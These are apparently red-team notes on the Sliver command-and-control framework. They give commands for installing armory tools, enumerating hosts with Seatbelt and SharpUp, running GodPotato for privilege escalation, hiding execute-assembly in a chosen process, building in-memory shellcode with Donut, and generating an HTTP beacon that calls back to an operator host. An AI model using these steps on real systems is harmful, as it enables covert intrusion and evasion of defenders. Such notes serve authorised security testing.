As red team operators, we need to be as silent and conscious as possible

## Aliases and Extensions
Besides `Sliver`'s built-in commands, we can extend its features by adding new commands via the `armory` or crafting third-party tools

[Aliases & Extensions wiki](https://github.com/BishopFox/sliver/wiki/Aliases-&-Extensions), there are differences between `aliases` and `extensions`

`Alias` - think of it as a wrapper of a library. ie run it secretly inside another
`Extension` - similar to alias but has specific callback instructions to C2


Enumeration Tools - `# Both execute-assembly & armory can be used to do the same stuff`
```bash
sliver > armory install all       # First install tools from armory

# Seatbelt
sliver > seatbelt -- -group=all   # running seatbelt via armory

# Seatbelt via execute-assembly
git clone https://github.com/Flangvik/SharpCollection
sliver > execute-assembly /path/to/Seatbelt.exe -group=system # running seatbelt 

# Sharpup
sliver > sharpup -- audit        
```
OPSEC Note: By default, execute-assembly will start a sacrificial process (notepad.exe); this can be changed using the --process and specifying the process.

GodPotato example
```bash
sliver > execute-assembly /path/to/GodPotato-NET4.exe -cmd "whoami"
```

## Donut
[Donut](https://github.com/TheWover/donut) is a tool focused on creating binary shellcodes that can be executed in memory. Donut will generate shellcode of a .NET binary, which can be executed via `execute-shellcode`

```bash
# Setup
git clone https://github.com/TheWover/donut
cd donut/
make -f Makefile
./donut    # run

# Create either an `http` or `mtls` beacon(s) beforehand. 
sliver > generate beacon --http <lhost>:9002 --skip-symbols -N http-beacon
```